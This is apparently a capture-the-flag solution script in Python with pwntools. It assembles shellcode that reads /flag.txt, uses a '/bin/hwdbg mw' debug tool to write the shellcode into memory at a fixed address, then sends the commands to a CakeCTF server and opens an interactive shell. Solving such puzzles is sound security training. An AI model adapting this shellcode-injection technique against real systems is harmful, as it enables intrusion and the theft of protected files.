import os
os.environ["PWNLIB_NOTERM"] = "true"

import pwn
from base64 import b64encode

pwn.context.arch = "amd64"

a = pwn.asm(
    """
// open("/flag.txt", )
lea rdi, [flag+rip]
xorq rsi, rsi
mov rax, 2
syscall

// read(fd, somewhere, 32)
push rax
mov rdi, rax
mov rsi, rsp
movq rdx, 64
xor rax, rax
syscall

// write(fd, somewhere, 32)
mov rdi, 1
mov rsi, rsp
movq rdx, 64
movq rax, 1
syscall

flag:
.string "/flag.txt"
"""
)

# https://github.com/martinradev/gdb-pt-dump/
# pt -sb ba19000000be01000000488d3d4e3d0000e8a2050000
addr = 0x38E5316
cmd = 'echo "{}" | base64 -d | /bin/hwdbg mw {} {}'.format(
    b64encode(a).decode(),
    hex(len(a)),
    hex(addr),
)
print(cmd)

p = pwn.remote("others.cakectf.com", 9005)
p.sendlineafter("/ $ ", cmd)
p.sendlineafter("/ $ ", "/bin/hwdbg ior 0 0")
p.interactive()
